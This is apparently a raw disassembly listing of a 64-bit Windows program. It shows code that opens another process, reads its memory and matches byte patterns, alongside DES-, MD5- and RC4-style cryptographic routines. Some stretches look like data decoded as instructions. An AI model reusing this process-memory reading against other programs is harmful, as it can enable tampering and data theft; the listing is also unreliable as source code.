mov r8d [ rbp - 0x10 ]
xor edx edx
mov ecx 0x43a
call [ OpenProcess@IAT ]
mov r15 rax
test rax rax
je r-xdata
mov rax [ r13 ]
mov ecx [ rax + 0x8 ]
mov [ rbp - 0x10 ] ecx
lea rdx [ rbp - 0x10 ]
mov rcx rdi
call sub_14000c590
test al al
je r-xdata
xor al al
cmp [ rbx + 0x8 ] 0x0
je r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
xor r12d r12d
mov [ rbx ] rax
mov [ rbp - 0x10 ] 0x2eb046a
mov [ rbp - 0xc ] 0xa35b066a
mov [ rbp - 0x20 ] 0x0
test r14d r14d
je r-xdata
test rcx rcx
je r-xdata
cmp [ rbx + 0x20 ] 0x0
je r-xdata
mov [ rdi ] r12
mov [ rdi + 0x8 ] r12
mov [ rdi + 0x10 ] r12
mov rcx rdi
call j_sub_14003ad04
mov rdx [ rdi + 0x8 ]
call sub_14000de60
mov rcx [ rdi ]
call j_sub_14003ad04
xor edx edx
lea rdx [ r12 + r14 ]
jmp r-xdata
call [ CloseHandle@IAT ]
cmp [ rbx + 0x10 ] 0x0
je r-xdata
mov [ rbp - 0x10 ] 0xa10a7502
mov [ rbp - 0x20 ] 0x0
test r14d r14d
je r-xdata
mov eax [ rbp - 0x20 ]
sub eax r12d
cdqe
lea rdx [ rax + r12 + 0x8 ]
mov r9d 0x4
cmp r15 0xffffffffffffffff
jne r-xdata
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] 0x8
lea r9 [ rbp - 0x20 ]
lea r8 [ rbp - 0x10 ]
mov rcx r12
call sub_1400069a0
test al al
je r-xdata
cmp [ rbx + 0x18 ] 0x0
je r-xdata
xor edx edx
lea rdx [ r12 + r14 ]
jmp r-xdata
mov [ rbp - 0x20 ] 0x0
lea rax [ rbp - 0x20 ]
mov [ rsp + 0x20 ] rax
lea r8 [ rbp - 0x10 ]
mov rcx r15
call [ ReadProcessMemory@IAT ]
test eax eax
je r-xdata
mov r8 rdx
mov edx r9d
lea rcx [ rbp - 0x10 ]
call sub_14003b740
test eax eax
sete al
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov [ rbp - 0x10 ] 0xa10a7401
mov [ rbp - 0x20 ] 0x0
test r14d r14d
je r-xdata
mov eax [ rbp - 0x20 ]
sub eax r12d
cdqe
lea rcx [ rax + r12 - 0xb ]
mov [ rbx + 0x10 ] rcx
mov [ rsp + 0x28 ] r15
mov [ rsp + 0x20 ] 0x4
lea r9 [ rbp - 0x20 ]
lea r8 [ rbp - 0x10 ]
mov rcx r12
call sub_1400069a0
test al al
je r-xdata
cmp [ rbp - 0x20 ] 0x4
jne r-xdata
jmp r-xdata
mov rcx [ rbp - 0x8 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x50 ]
mov rbx [ r11 + 0x38 ]
mov rsi [ r11 + 0x40 ]
mov rdi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
xor edx edx
lea rdx [ r12 + r14 ]
jmp r-xdata
mov rax [ rbp - 0x10 ]
add rax 0xfffffffffffffffc
mov [ rbx + 0x8 ] rax
mov [ rbp - 0x10 ] 0x33575653
mov [ rbp - 0xc ] 0x3bff
mov [ rbp - 0xa ] 0x5
mov [ rbp - 0x20 ] 0x0
test r14d r14d
je r-xdata
mov eax [ rbp - 0x20 ]
sub eax r12d
cdqe
lea rcx [ rax + r12 - 0x6 ]
mov [ rbx + 0x18 ] rcx
mov [ rsp + 0x28 ] r15
mov [ rsp + 0x20 ] 0x4
lea r9 [ rbp - 0x20 ]
lea r8 [ rbp - 0x10 ]
mov rcx r12
call sub_1400069a0
test al al
je r-xdata
xor edx edx
lea rdx [ r12 + r14 ]
jmp r-xdata
mov eax [ rbp - 0x20 ]
sub eax r12d
cdqe
lea rcx [ rax + r12 - 0xb ]
mov [ rbx + 0x20 ] rcx
mov [ rsp + 0x28 ] r15
mov [ rsp + 0x20 ] 0x7
lea r9 [ rbp - 0x20 ]
lea r8 [ rbp - 0x10 ]
mov rcx r12
call sub_1400069a0
test al al
je r-xdata
sub_140032350
movzx eax [ rcx ]
lea rdx [ r--data ]
movzx eax [ rax + rdx ]
mov [ rcx ] al
movzx eax [ rcx + 0x1 ]
movzx eax [ rax + rdx ]
mov [ rcx + 0x1 ] al
movzx eax [ rcx + 0x2 ]
movzx eax [ rax + rdx ]
mov [ rcx + 0x2 ] al
movzx eax [ rcx + 0x3 ]
movzx eax [ rax + rdx ]
mov [ rcx + 0x3 ] al
movzx eax [ rcx + 0x4 ]
movzx eax [ rax + rdx ]
mov [ rcx + 0x4 ] al
movzx eax [ rcx + 0x5 ]
movzx eax [ rax + rdx ]
mov [ rcx + 0x5 ] al
movzx eax [ rcx + 0x6 ]
movzx eax [ rax + rdx ]
mov [ rcx + 0x6 ] al
movzx eax [ rcx + 0x7 ]
movzx eax [ rax + rdx ]
mov [ rcx + 0x7 ] al
retn
sub_1400323b0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push r12
movzx r11d [ rcx ]
movzx eax [ rcx + 0x1 ]
lea r8 [ rcx + 0x1 ]
shl eax 0x8
movzx ecx [ r8 + 0x6 ]
mov rsi rdx
or r11d eax
movzx eax [ r8 + 0x1 ]
movzx edx [ r8 + 0x3 ]
shl eax 0x10
shl ecx 0x8
lea rdi [ r--data ]
or r11d eax
movzx eax [ r8 + 0x2 ]
lea rbp [ r--data ]
shl eax 0x18
or r11d eax
movzx eax [ r8 + 0x4 ]
shl eax 0x8
or edx eax
movzx eax [ r8 + 0x5 ]
or ecx eax
shl ecx 0x10
or edx ecx
mov eax edx
shr eax 0x4
xor eax r11d
and eax 0xf0f0f0f
xor r11d eax
shl eax 0x4
xor edx eax
mov ecx r11d
shl ecx 0x12
xor ecx r11d
and ecx 0xcccc0000
mov eax ecx
shr eax 0x12
xor eax ecx
mov ecx edx
xor r11d eax
shl ecx 0x12
xor ecx edx
and ecx 0xcccc0000
mov eax ecx
shr eax 0x12
xor eax ecx
xor edx eax
mov eax edx
shr eax 0x1
xor eax r11d
and eax 0x55555555
xor r11d eax
add eax eax
xor edx eax
mov eax r11d
shr eax 0x8
xor eax edx
and eax 0xff00ff
xor edx eax
shl eax 0x8
xor r11d eax
mov eax edx
shr eax 0x1
xor eax r11d
and eax 0x55555555
xor r11d eax
add eax eax
xor edx eax
mov eax r11d
and eax 0xf000000f
mov ebx edx
shr ebx 0xc
and ebx 0xff0
or ebx eax
movzx eax dl
and edx 0xff00
shr ebx 0x4
shl eax 0x10
or ebx eax
or ebx edx
and r11d 0xfffffff
lea r12 [ r--data ]
nop [ rax + rax ] ax
shl ecx 0x1b
shr eax 0x1
mov r11d ecx
mov ecx ebx
or r11d eax
mov eax ebx
shl ecx 0x1b
shr eax 0x1
shl ecx 0x1a
shr eax 0x2
mov r11d ecx
mov ecx ebx
or r11d eax
mov eax ebx
shl ecx 0x1a
shr eax 0x2
jmp r-xdata
cmp [ rdi ] 0x0
mov ecx r11d
mov eax r11d
je r-xdata
mov rbx [ rsp + 0x10 ]
mov rbp [ rsp + 0x18 ]
mov rsi [ rsp + 0x20 ]
mov rdi [ rsp + 0x28 ]
pop r12
retn
mov ebx ecx
and r11d 0xfffffff
add rdi 0x4
or ebx eax
mov eax r11d
mov r9d r11d
and eax 0xc00000
and ebx 0xfffffff
and r9d 0x3f
mov r8d r11d
add rsi 0x8
shr r8 0x1
mov rdx r8
mov rcx r8
and r8d 0x60000
and edx 0x7000000
and ecx 0xf00
or rdx rax
mov eax r11d
and eax 0x100000
shr rdx 0x1
or rdx rax
mov eax r11d
and eax 0xc0
shr rdx 0x14
mov r10d [ rbp + rdx * 4 + 0x300 ]
or rcx rax
mov eax r11d
and eax 0x1e000
shr rcx 0x6
mov edx ebx
or r10d [ rbp + rcx * 4 + 0x100 ]
or r8 rax
shr rdx 0x1
shr r8 0xd
mov rcx rdx
and edx 0x6000000
or r10d [ rbp + r8 * 4 + 0x200 ]
and ecx 0x1e00
mov eax ebx
or r10d [ rbp + r9 * 4 ]
and eax 0x180
mov r9d ebx
or rcx rax
and r9d 0x3f
mov eax ebx
and eax 0x1e00000
shr rcx 0x7
mov r8d [ rbp + rcx * 4 + 0x500 ]
or rdx rax
movzx ecx r10w
shr rdx 0x15
shr r10d 0x10
mov eax ebx
or r8d [ rbp + rdx * 4 + 0x700 ]
shr rax 0xf
and eax 0x3f
or r8d [ rbp + rax * 4 + 0x600 ]
or r8d [ rbp + r9 * 4 + 0x400 ]
mov eax r8d
and r8d 0xffff0000
shl eax 0x10
or r10d r8d
or ecx eax
ror ecx 0x1e
ror r10d 0x1a
mov [ rsi - 0x8 ] ecx
mov [ rsi - 0x4 ] r10d
cmp rdi r12
jl r-xdata
sub_140032660
mov eax 0x28
call sub_14003d700
sub rsp rax
xor r8d r8d
mov r10 rcx
lea r11 [ __dos_header ]
mov r9d r8d
nop [ rax ] eax
or eax 0xffffffff
add rsp 0x28
retn
inc r9d
inc r10
cmp r9d 0x8
jb r-xdata
movzx eax [ r10 ]
cmp al [ rax + r11 + 0x5b750 ]
jne r-xdata
nop [ rax + rax ] ax
mov eax 0xfffffffe
add rsp 0x28
retn
inc r8d
cmp r8d 0x10
jl r-xdata
movsxd rax r8d
mov rax [ r11 + rax * 8 + 0x5b850 ]
cmp rax [ rcx ]
je r-xdata
call sub_1400323b0
xor eax eax
add rsp 0x28
retn
sub_140032710
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push rdi
mov eax 0x20
call sub_14003d700
sub rsp rax
mov rdi r8
mov rbp rdx
mov rsi rcx
test r8 r8
je r-xdata
mov rbp [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
mov eax 0x1
add rsp 0x20
pop rdi
retn
mov eax [ rcx + 0x10 ]
lea ecx [ rax + r8 * 8 ]
cmp ecx eax
jae r-xdata
mov rax r8
mov [ rsi + 0x10 ] ecx
mov ecx [ rsi + 0x58 ]
shr rax 0x1d
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x38 ] r12
add [ rsi + 0x14 ] eax
test rcx rcx
je r-xdata
inc [ rsi + 0x14 ]
mov rbx rdi
shr rbx 0x6
test rbx rbx
je r-xdata
lea r12 [ rsi + 0x18 ]
cmp r8 0x40
jae r-xdata
test rdi rdi
je r-xdata
mov r8 rbx
mov rdx rbp
mov rcx rsi
call sub_140033240
shl rbx 0x6
add rbp rbx
sub rdi rbx
mov ebx 0x40
sub rbx rcx
add rcx r12
mov r8 rbx
call sub_14003a8c0
mov r8d 0x1
mov rdx r12
mov rcx rsi
call sub_140033240
mov [ rsi + 0x58 ] 0x0
add rbp rbx
sub rdi rbx
xor eax eax
mov [ r12 ] rax
mov [ r12 + 0x8 ] rax
mov [ r12 + 0x10 ] rax
mov [ r12 + 0x18 ] rax
mov [ r12 + 0x20 ] rax
mov [ r12 + 0x28 ] rax
mov [ r12 + 0x30 ] rax
mov [ r12 + 0x38 ] rax
lea rax [ rcx + r8 ]
cmp rax 0x40
jae r-xdata
mov rbx [ rsp + 0x30 ]
mov r12 [ rsp + 0x38 ]
lea rcx [ rsi + 0x18 ]
mov r8 rdi
mov rdx rbp
mov [ rsi + 0x58 ] edi
call sub_14003a8c0
add rcx r12
call sub_14003a8c0
add [ rsi + 0x58 ] edi
jmp r-xdata
sub_140032840
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
mov eax 0x20
call sub_14003d700
sub rsp rax
mov ebx [ rdx + 0x58 ]
mov rsi rdx
mov rbp rcx
mov [ rbx + rdx + 0x18 ] 0x80
inc rbx
cmp rbx 0x38
jbe r-xdata
mov r8d 0x38
lea rcx [ rbx + rsi + 0x18 ]
xor edx edx
sub r8 rbx
call sub_14003d760
movzx eax [ rsi + 0x10 ]
lea rdx [ rsi + 0x18 ]
mov [ rsi + 0x50 ] al
movzx eax [ rsi + 0x11 ]
mov r8d 0x1
mov [ rsi + 0x51 ] al
movzx eax [ rsi + 0x12 ]
mov rcx rsi
mov [ rsi + 0x52 ] al
movzx eax [ rsi + 0x13 ]
mov [ rsi + 0x53 ] al
movzx eax [ rsi + 0x14 ]
mov [ rsi + 0x54 ] al
movzx eax [ rsi + 0x15 ]
mov [ rsi + 0x55 ] al
movzx eax [ rsi + 0x16 ]
mov [ rsi + 0x56 ] al
movzx eax [ rsi + 0x17 ]
mov [ rsi + 0x57 ] al
call sub_140033240
mov rbx [ rsp + 0x30 ]
mov [ rsi + 0x58 ] 0x0
xor eax eax
mov [ rsi + 0x18 ] rax
mov [ rsi + 0x20 ] rax
mov [ rsi + 0x28 ] rax
mov [ rsi + 0x30 ] rax
mov [ rsi + 0x38 ] rax
mov [ rsi + 0x40 ] rax
mov [ rsi + 0x48 ] rax
mov [ rsi + 0x50 ] rax
mov ecx [ rsi ]
mov [ rbp ] cl
mov eax ecx
shr eax 0x8
mov [ rbp + 0x1 ] al
mov eax ecx
shr ecx 0x18
shr eax 0x10
mov [ rbp + 0x2 ] al
mov [ rbp + 0x3 ] cl
mov ecx [ rsi + 0x4 ]
mov [ rbp + 0x4 ] cl
mov eax ecx
shr eax 0x8
mov [ rbp + 0x5 ] al
mov eax ecx
shr ecx 0x18
shr eax 0x10
mov [ rbp + 0x6 ] al
mov [ rbp + 0x7 ] cl
mov ecx [ rsi + 0x8 ]
mov [ rbp + 0x8 ] cl
mov eax ecx
shr eax 0x8
mov [ rbp + 0x9 ] al
mov eax ecx
shr ecx 0x18
shr eax 0x10
mov [ rbp + 0xa ] al
mov [ rbp + 0xb ] cl
mov edx [ rsi + 0xc ]
mov rsi [ rsp + 0x40 ]
mov [ rbp + 0xc ] dl
mov ecx edx
shr ecx 0x8
mov eax 0x1
mov [ rbp + 0xd ] cl
mov ecx edx
shr ecx 0x10
shr edx 0x18
mov [ rbp + 0xe ] cl
mov [ rbp + 0xf ] dl
mov rbp [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
lea rcx [ rbx + rdx + 0x18 ]
mov r8d 0x40
xor edx edx
sub r8 rbx
call sub_14003d760
xor ebx ebx
lea rdx [ rsi + 0x18 ]
lea r8d [ rbx + 0x1 ]
mov rcx rsi
call sub_140033240
sub_1400329b0
push rbx
mov eax 0x20
call sub_14003d700
sub rsp rax
lea r8d [ rax + 0x3c ]
xor edx edx
mov rbx rcx
call sub_14003d760
mov [ rbx ] 0x67452301
mov [ rbx + 0x4 ] 0xefcdab89
mov [ rbx + 0x8 ] 0x98badcfe
mov [ rbx + 0xc ] 0x10325476
mov eax 0x1
add rsp 0x20
pop rbx
retn
sub_140032a0d
mov rdi rcx
mov rsi rdx
mov rdx r8
mov rcx r9
or rsi rsi
jne r-xdata
push rbx
push r12
push r13
add rdi 0x8
mov r8d [ rdi - 0x8 ]
mov r12d [ rdi - 0x4 ]
cmp [ rdi + 0x100 ] 0xffffffff
je r-xdata
mov rdi [ rsp + 0x8 ]
mov rsi [ rsp + 0x10 ]
retn
add r8b 0x1
movzx r9d [ rdi + r8 ]
test rsi 0xfffffffffffffff8
je r-xdata
inc r8b
mov r9d [ rdi + r8 * 4 ]
test rsi 0xfffffffffffffff8
je r-xdata
add r12b r9b
movzx r13d [ rdi + r12 ]
mov [ rdi + r12 ] r9b
mov [ rdi + r8 ] r13b
add r13b r9b
add r8b 0x1
movzx r13d r13b
movzx r8d r8b
movzx r13d [ rdi + r13 ]
movzx r9d [ rdi + r8 ]
xor r13b [ rdx ]
lea rdx [ rdx + 0x1 ]
mov [ rcx ] r13b
lea rcx [ rcx + 0x1 ]
sub rsi 0x1
jne r-xdata
cmp [ rdi + 0x104 ] 0x0
jne r-xdata
add r12b r9b
mov r13d [ rdi + r12 * 4 ]
mov [ rdi + r12 * 4 ] r9d
mov [ rdi + r8 * 4 ] r13d
add r9b r13b
inc r8b
mov r13d [ rdi + r9 * 4 ]
mov r9d [ rdi + r8 * 4 ]
xor r13b [ rdx ]
inc rdx
mov [ rcx ] r13b
inc rcx
dec rsi
jne r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
add r12b r9b
mov r10 r8
mov r13d [ rdi + r12 * 4 ]
ror rax 0x8
inc r10b
mov r11d [ rdi + r10 * 4 ]
cmp r12 r10
mov [ rdi + r12 * 4 ] r9d
cmove r11 r9
mov [ rdi + r8 * 4 ] r13d
add r13b r9b
mov al [ rdi + r13 * 4 ]
add r12b r11b
mov r8 r10
mov r13d [ rdi + r12 * 4 ]
ror rax 0x8
inc r8b
mov r9d [ rdi + r8 * 4 ]
cmp r12 r8
mov [ rdi + r12 * 4 ] r11d
cmove r9 r11
mov [ rdi + r10 * 4 ] r13d
add r13b r11b
mov al [ rdi + r13 * 4 ]
add r12b r9b
mov r10 r8
mov r13d [ rdi + r12 * 4 ]
ror rax 0x8
inc r10b
mov r11d [ rdi + r10 * 4 ]
cmp r12 r10
mov [ rdi + r12 * 4 ] r9d
cmove r11 r9
mov [ rdi + r8 * 4 ] r13d
add r13b r9b
mov al [ rdi + r13 * 4 ]
add r12b r11b
mov r8 r10
mov r13d [ rdi + r12 * 4 ]
ror rax 0x8
inc r8b
mov r9d [ rdi + r8 * 4 ]
cmp r12 r8
mov [ rdi + r12 * 4 ] r11d
cmove r9 r11
mov [ rdi + r10 * 4 ] r13d
add r13b r11b
mov al [ rdi + r13 * 4 ]
add r12b r9b
mov r10 r8
mov r13d [ rdi + r12 * 4 ]
ror rax 0x8
inc r10b
mov r11d [ rdi + r10 * 4 ]
cmp r12 r10
mov [ rdi + r12 * 4 ] r9d
cmove r11 r9
mov [ rdi + r8 * 4 ] r13d
add r13b r9b
mov al [ rdi + r13 * 4 ]
add r12b r11b
mov r8 r10
mov r13d [ rdi + r12 * 4 ]
ror rax 0x8
inc r8b
mov r9d [ rdi + r8 * 4 ]
cmp r12 r8
mov [ rdi + r12 * 4 ] r11d
cmove r9 r11
mov [ rdi + r10 * 4 ] r13d
add r13b r11b
mov al [ rdi + r13 * 4 ]
add r12b r9b
mov r10 r8
mov r13d [ rdi + r12 * 4 ]
ror rax 0x8
inc r10b
mov r11d [ rdi + r10 * 4 ]
cmp r12 r10
mov [ rdi + r12 * 4 ] r9d
cmove r11 r9
mov [ rdi + r8 * 4 ] r13d
add r13b r9b
mov al [ rdi + r13 * 4 ]
add r12b r11b
mov r8 r10
mov r13d [ rdi + r12 * 4 ]
ror rax 0x8
inc r8b
mov r9d [ rdi + r8 * 4 ]
cmp r12 r8
mov [ rdi + r12 * 4 ] r11d
cmove r9 r11
mov [ rdi + r10 * 4 ] r13d
add r13b r11b
mov al [ rdi + r13 * 4 ]
ror rax 0x8
sub rsi 0x8
xor rax [ rdx ]
add rdx 0x8
mov [ rcx ] rax
add rcx 0x8
test rsi 0xfffffffffffffff8
jne r-xdata
sub r8b 0x1
mov [ rdi - 0x8 ] r8d
mov [ rdi - 0x4 ] r12d
mov r13 [ rsp ]
mov r12 [ rsp + 0x8 ]
mov rbx [ rsp + 0x10 ]
add rsp 0x18
mov rdi [ rsp + 0x8 ]
mov rsi [ rsp + 0x10 ]
retn
mov eax [ rdx ]
mov ebx [ rdx + 0x4 ]
add r12b r9b
lea r10 [ r8 + 0x1 ]
movzx r13d [ rdi + r12 ]
movzx r10d r10b
movzx r11d [ rdi + r10 ]
mov [ rdi + r12 ] r9b
cmp r12 r10
mov [ rdi + r8 ] r13b
jne r-xdata
cmp rsi 0x0
jne r-xdata
add r13b r9b
xor al [ rdi + r13 ]
ror eax 0x8
add r12b r11b
lea r8 [ r10 + 0x1 ]
movzx r13d [ rdi + r12 ]
movzx r8d r8b
movzx r9d [ rdi + r8 ]
mov [ rdi + r12 ] r11b
cmp r12 r8
mov [ rdi + r10 ] r13b
jne r-xdata
mov r11 r9
jmp r-xdata
add r13b r11b
xor al [ rdi + r13 ]
ror eax 0x8
add r12b r9b
lea r10 [ r8 + 0x1 ]
movzx r13d [ rdi + r12 ]
movzx r10d r10b
movzx r11d [ rdi + r10 ]
mov [ rdi + r12 ] r9b
cmp r12 r10
mov [ rdi + r8 ] r13b
jne r-xdata
mov r9 r11
add r13b r9b
xor al [ rdi + r13 ]
ror eax 0x8
add r12b r11b
lea r8 [ r10 + 0x1 ]
movzx r13d [ rdi + r12 ]
movzx r8d r8b
movzx r9d [ rdi + r8 ]
mov [ rdi + r12 ] r11b
cmp r12 r8
mov [ rdi + r10 ] r13b
jne r-xdata
mov r11 r9
add r13b r11b
xor al [ rdi + r13 ]
ror eax 0x8
add r12b r9b
lea r10 [ r8 + 0x1 ]
movzx r13d [ rdi + r12 ]
movzx r10d r10b
movzx r11d [ rdi + r10 ]
mov [ rdi + r12 ] r9b
cmp r12 r10
mov [ rdi + r8 ] r13b
jne r-xdata
mov r9 r11
add r13b r9b
xor bl [ rdi + r13 ]
ror ebx 0x8
add r12b r11b
lea r8 [ r10 + 0x1 ]
movzx r13d [ rdi + r12 ]
movzx r8d r8b
movzx r9d [ rdi + r8 ]
mov [ rdi + r12 ] r11b
cmp r12 r8
mov [ rdi + r10 ] r13b
jne r-xdata
mov r11 r9
add r13b r11b
xor bl [ rdi + r13 ]
ror ebx 0x8
add r12b r9b
lea r10 [ r8 + 0x1 ]
movzx r13d [ rdi + r12 ]
movzx r10d r10b
movzx r11d [ rdi + r10 ]
mov [ rdi + r12 ] r9b
cmp r12 r10
mov [ rdi + r8 ] r13b
jne r-xdata
mov r9 r11
add r13b r9b
xor bl [ rdi + r13 ]
ror ebx 0x8
add r12b r11b
lea r8 [ r10 + 0x1 ]
movzx r13d [ rdi + r12 ]
movzx r8d r8b
movzx r9d [ rdi + r8 ]
mov [ rdi + r12 ] r11b
cmp r12 r8
mov [ rdi + r10 ] r13b
jne r-xdata
mov r11 r9
add r13b r11b
xor bl [ rdi + r13 ]
ror ebx 0x8
lea rsi [ rsi - 0x8 ]
mov [ rcx ] eax
lea rdx [ rdx + 0x8 ]
mov [ rcx + 0x4 ] ebx
lea rcx [ rcx + 0x8 ]
test rsi 0xfffffffffffffff8
jne r-xdata
mov r9 r11
cmp rsi 0x0
jne r-xdata
jmp r-xdata
sub_140032e8d
mov rdi rcx
mov rsi rdx
mov rdx r8
lea rdi [ rdi + 0x8 ]
lea rdx [ rdx + rsi ]
neg rsi
mov rcx rsi
xor eax eax
xor r9 r9
xor r10 r10
xor r11 r11
mov r8d [ rw-data ]
bt r8d 0x14
jae r-xdata
mov [ rdi + rax * 4 ] eax
add al 0x1
jae r-xdata
bt r8d 0x1e
setb r9b
mov [ rdi + 0x104 ] r9d
jmp r-xdata
xor r9 r9
xor r8 r8
nop
nop
nop
mov [ rdi + rax ] al
add al 0x1
jae r-xdata
mov r10d [ rdi + r9 * 4 ]
add r8b [ rdx + rsi ]
add r8b r10b
add rsi 0x1
mov r11d [ rdi + r8 * 4 ]
cmove rsi rcx
mov [ rdi + r8 * 4 ] r10d
mov [ rdi + r9 * 4 ] r11d
add r9b 0x1
jae r-xdata
jmp r-xdata
xor r9 r9
xor r8 r8
nop
nop
nop
xor eax eax
mov [ rdi - 0x8 ] eax
mov [ rdi - 0x4 ] eax
mov rdi [ rsp + 0x8 ]
mov rsi [ rsp + 0x10 ]
retn
mov [ rdi + r8 ] r10b
mov [ rdi + r9 ] r11b
add r9b 0x1
jae r-xdata
mov rsi rcx
mov r10b [ rdi + r9 ]
add r8b [ rdx + rsi ]
add r8b r10b
add rsi 0x1
mov r11b [ rdi + r8 ]
jne r-xdata
mov [ rdi + 0x100 ] 0xffffffff
sub_140032fe6
push rdx
xor al 0x20
outsw
jb r-xdata
outsb
jae r-xdata
js r-xdata
mov esp [ rax - 0x10 ]
insb
outsd
jb r-xdata
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push rsi
push rdi
push rbx
push rbp
push r12
push r13
push r14
push r15
pushfq
sub rsp 0x40
mov rax [ r8 + 0x78 ]
mov rbx [ r8 + 0xf8 ]
lea r10 [ r-xdata ]
cmp rbx r10
jb r-xdata
pop rdi
xor al 0x2c
and [ rbx + 0x52 ] al
pop rcx
push rax
push rsp
push r11
and [ rdx + 0x79 ] ah
and [ rcx ] bh
jo r-xdata
mov rdi [ r9 + 0x28 ]
mov rsi r8
mov ecx 0x9a
cld
[ rdi ] [ rsi ]
mov rsi r9
xor rcx rcx
mov rdx [ rsi + 0x8 ]
mov r8 [ rsi ]
mov r9 [ rsi + 0x10 ]
mov r10 [ rsi + 0x28 ]
lea r11 [ rsi + 0x38 ]
lea r12 [ rsi + 0x18 ]
mov [ rsp + 0x20 ] r10
mov [ rsp + 0x28 ] r11
mov [ rsp + 0x30 ] r12
mov [ rsp + 0x38 ] rcx
call [ RtlVirtualUnwind@IAT ]
mov eax 0x1
add rsp 0x40
popfq
pop r15
pop r14
pop r13
pop r12
pop rbp
pop rbx
pop rdi
pop rsi
retn
mov r13 [ rax - 0x18 ]
mov [ r8 + 0x90 ] rbx
mov [ r8 + 0xd8 ] r12
mov [ r8 + 0xe0 ] r13
sbb [ rax - 0x75 ] cl
pop rax
clc
add [ rax - 0x6f6f6f70 ] dl
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
mov rdi [ rax + 0x8 ]
mov rsi [ rax + 0x10 ]
mov [ r8 + 0x98 ] rax
mov [ r8 + 0xa8 ] rsi
mov [ r8 + 0xb0 ] rdi
jmp r-xdata
mov rax [ r8 + 0x98 ]
lea r10 [ r-xdata ]
cmp rbx r10
mov r12 [ rax - 0x10 ]
shl [ rbx + 0x25 ] cl
jb r-xdata
lea rax [ rax + 0x18 ]
mov rbx [ rax - 0x8 ]
jae r-xdata
outsd
jo r-xdata
std
sub_140033150
mov [ rsp + 0x10 ] rbx
push rdi
mov eax 0x20
call sub_14003d700
sub rsp rax
movzx r10d [ rcx ]
movzx eax [ rcx + 0x1 ]
lea r11 [ rcx + 0x1 ]
movzx ecx [ rcx + 0x7 ]
shl eax 0x8
mov rdi rdx
movzx edx [ r11 + 0x3 ]
or r10d eax
movzx eax [ r11 + 0x1 ]
shl eax 0x10
shl ecx 0x8
mov rbx r8
or r10d eax
movzx eax [ r11 + 0x2 ]
mov r8d r9d
shl eax 0x18
or r10d eax
movzx eax [ r11 + 0x4 ]
shl eax 0x8
mov [ rsp + 0x30 ] r10d
or edx eax
movzx eax [ r11 + 0x5 ]
or ecx eax
shl ecx 0x10
or ecx edx
mov rdx rbx
mov [ rsp + 0x34 ] ecx
lea rcx [ rsp + 0x30 ]
call sub_1400344f0
mov ecx [ rsp + 0x30 ]
movzx r11d [ rsp + 0x30 ]
mov rbx [ rsp + 0x38 ]
mov [ rdi ] r11b
mov eax ecx
shr eax 0x8
mov [ rdi + 0x1 ] al
mov eax ecx
shr ecx 0x18
shr eax 0x10
mov [ rdi + 0x2 ] al
movzx eax [ rsp + 0x34 ]
mov [ rdi + 0x3 ] cl
mov ecx [ rsp + 0x34 ]
mov [ rdi + 0x4 ] al
mov eax ecx
shr eax 0x8
mov [ rdi + 0x5 ] al
mov eax ecx
shr eax 0x10
shr ecx 0x18
mov [ rdi + 0x6 ] al
mov [ rdi + 0x7 ] cl
add rsp 0x20
pop rdi
retn
sub_14003324d
mov rdi rcx
mov rsi rdx
mov rdx r8
push rbp
push rbx
push r12
push r14
push r15
mov rbp rdi
shl rdx 0x6
lea rdi [ rsi + rdx ]
mov eax [ rbp ]
mov ebx [ rbp + 0x4 ]
mov ecx [ rbp + 0x8 ]
mov edx [ rbp + 0xc ]
cmp rsi rdi
je r-xdata
mov [ rbp ] eax
mov [ rbp + 0x4 ] ebx
mov [ rbp + 0x8 ] ecx
mov [ rbp + 0xc ] edx
mov r15 [ rsp ]
mov r14 [ rsp + 0x8 ]
mov r12 [ rsp + 0x10 ]
mov rbx [ rsp + 0x18 ]
mov rbp [ rsp + 0x20 ]
add rsp 0x28
mov rdi [ rsp + 0x8 ]
mov rsi [ rsp + 0x10 ]
retn
mov r8d eax
mov r9d ebx
mov r14d ecx
mov r15d edx
mov r10d [ rsi ]
mov r11d edx
xor r11d ecx
lea eax [ rax + r10 - 0x28955b88 ]
and r11d ebx
xor r11d edx
mov r10d [ rsi + 0x4 ]
add eax r11d
rol eax 0x7
mov r11d ecx
add eax ebx
xor r11d ebx
lea edx [ rdx + r10 - 0x173848aa ]
and r11d eax
xor r11d ecx
mov r10d [ rsi + 0x8 ]
add edx r11d
rol edx 0xc
mov r11d ebx
add edx eax
xor r11d eax
lea ecx [ rcx + r10 + 0x242070db ]
and r11d edx
xor r11d ebx
mov r10d [ rsi + 0xc ]
add ecx r11d
rol ecx 0x11
mov r11d eax
add ecx edx
xor r11d edx
lea ebx [ rbx + r10 - 0x3e423112 ]
and r11d ecx
xor r11d eax
mov r10d [ rsi + 0x10 ]
add ebx r11d
rol ebx 0x16
mov r11d edx
add ebx ecx
xor r11d ecx
lea eax [ rax + r10 - 0xa83f051 ]
and r11d ebx
xor r11d edx
mov r10d [ rsi + 0x14 ]
add eax r11d
rol eax 0x7
mov r11d ecx
add eax ebx
xor r11d ebx
lea edx [ rdx + r10 + 0x4787c62a ]
and r11d eax
xor r11d ecx
mov r10d [ rsi + 0x18 ]
add edx r11d
rol edx 0xc
mov r11d ebx
add edx eax
xor r11d eax
lea ecx [ rcx + r10 - 0x57cfb9ed ]
and r11d edx
xor r11d ebx
mov r10d [ rsi + 0x1c ]
add ecx r11d
rol ecx 0x11
mov r11d eax
add ecx edx
xor r11d edx
lea ebx [ rbx + r10 - 0x2b96aff ]
and r11d ecx
xor r11d eax
